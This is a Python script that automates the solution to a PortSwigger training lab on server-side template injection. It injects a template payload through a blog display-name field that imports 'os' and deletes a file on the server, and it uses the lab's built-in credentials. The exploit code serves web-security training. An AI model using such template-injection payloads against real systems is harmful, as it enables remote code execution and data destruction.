#!/usr/bin/env python3
# Basic server-side template injection (code context)
# Lab-Link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def login(client, host, username, password):
    url = f'{host}/login'
    token = get_csrf_token(client, url)
    data = {'csrf': token,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def get_random_post_id(client, host):
    r = client.get(host)
    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        first_post = soup.find('div', attrs={'class': 'blog-post'})
        # first_post contains the full div of the first post
        # ID extracted from <a href="/post?postId=4"><img src="/image/blog/posts/42.jpg"/></a>
        postID = first_post.find_next('a')['href'].split('=')[1]
    except TypeError:
        return None
    return postID


def post_comment(client, host, postID):
    url = f'{host}/post'
    data = {
        'csrf': get_csrf_token(client, f'{url}?postId={postID}'),
        'postId': postID,
        'comment': 'SomeComment'
    }
    if client.post(f'{url}/comment', data=data, allow_redirects=False).status_code != 302:
        return None
    return True


def change_display_name(client, host):
    url = f'{host}/my-account'
    data = {
        'csrf': get_csrf_token(client, f'{url}'),
        'blog-post-author-display': 'user.name}}{%import os;os.unlink("/home/carlos/morale.txt")%}{{2*3'
    }
    if client.post(f'{url}/change-blog-post-author-display', data=data, allow_redirects=False).status_code != 302:
        return None
    return True


def main():
    print('[+] Basic server-side template injection (code context)')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if not login(client, host, 'wiener', 'peter'):
            print(f'[-] Failed to log in as wiener')
            sys.exit(-2)
        print(f'[+] Log in as wiener')

        if not change_display_name(client, host):
            print(f'[-] Failed to change display name')
            sys.exit(-3)
        print(f'[+] Change display name')

        postID = get_random_post_id(client, host)
        if postID is None:
            print(f'[-] Failed to extract a valid post ID')
            sys.exit(-4)
        print(f'[+] Extract valid post ID: {postID}')

        if not post_comment(client, host, postID):
            print(f'[-] Failed to post a comment in post {postID}')
            sys.exit(-5)
        print(f'[+] Post a comment in post {postID}')

        url = f'{host}/post?postId={postID}'
        if client.get(url).status_code != 200:
            print(f'[-] Failed to refresh comment page')
            sys.exit(-6)
        print(f'[+] Refresh comment page')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
